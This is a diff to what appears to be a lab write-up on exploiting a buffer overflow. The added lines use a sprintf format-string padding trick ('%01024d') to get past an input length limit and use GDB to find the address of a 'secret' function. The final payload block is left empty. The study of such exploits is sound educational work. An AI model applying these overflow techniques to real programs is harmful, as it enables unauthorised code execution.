@@ -95,6 +95,23 @@ To exploit the program and obtain the secret, we target the buffer overflow vuln
 > 
 > **Answer:**
 > Quite similar to the last question, except our input can only be less than 100 characters. Because `sprintf` is used instead of `strcpy`, we can get around this limitation by padding the input inside this function, rather than through python.
+> 
+> ```
+> "%01024d"
+>```
+>
+>Then we just need to find the address of the `secret` through GDB.
+>```
+>(gdb) print secret
+$1 = {void ()} 0x565561fd \<secret>
+>```
+>Converting the address to little endian in hexadecimal and combining it all together, we get:
+>
+>```
+>
+>```
+
+
 
 
 
